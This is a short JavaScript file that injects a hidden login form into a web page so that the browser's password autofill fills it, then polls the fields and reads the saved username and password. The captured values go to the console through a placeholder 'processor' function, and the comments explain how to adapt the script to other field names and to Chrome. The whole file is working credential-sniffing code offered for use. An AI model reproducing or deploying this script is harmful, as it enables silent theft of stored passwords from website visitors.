// IMPORTANT NOTE : remove retry functionality in `sniffInputField` if used to sniff from chrome browser
// since chrome requires the user to interact with the page
// 
// 
// `input_names` will be the input field's name, type, and id.
// if the html form has nonequal name, type, or id. Edit the
// for loop in injectForm function :) (2d array)
//


var input_names = ['Username', 'Password'];


var injectForm = function(inputs) {

  var container = document.createElement('div'); // form container
  container.style.display = 'none'; // make invisible

  var form = document.createElement('form');
  form.attributes.autocomplete = 'on';

for (var i = 0; i < inputs.length; i++){ // create all input fields
  var input_field = document.createElement('input');
  input_field.id = inputs[i];
  input_field.type = inputs[i];
  input_field.name = inputs[i];
	input_field.className += " input-sniffer"; // used for future reference, not styling ;)
  form.appendChild(input_field);
}

  container.appendChild(form);
  document.body.appendChild(container);
	console.log("form injected");
};

var printResult = function(elementId, sniffedValue){ // process sniffed data
  console.log(elementId + ", " + sniffedValue);
};

var sniffInputField = function(fieldId, retry_number){
  // if retry_number exceeds 3, then autocomplete didn't function on this field
  if (retry_number > 3) return 'sniffing failed';

  var inputElement = document.getElementById(fieldId);

  if (inputElement.value.length) printResult(fieldId, inputElement.value); // processor

  else window.setTimeout(sniffInputField, 200, fieldId, ++retry_number);  // wait for 200ms and retry recursively

};

var sniffInputFields = function(){
  var input_fields = document.getElementsByClassName('input-sniffer');
  for (var i = 0; i < input_fields.length; i++) sniffInputField(input_fields[i].id, 1);
};

var sniffFormInfo = function(inputs) { // wrapper 
  injectForm(inputs);
  sniffInputFields();
};


sniffFormInfo(input_names); // run program

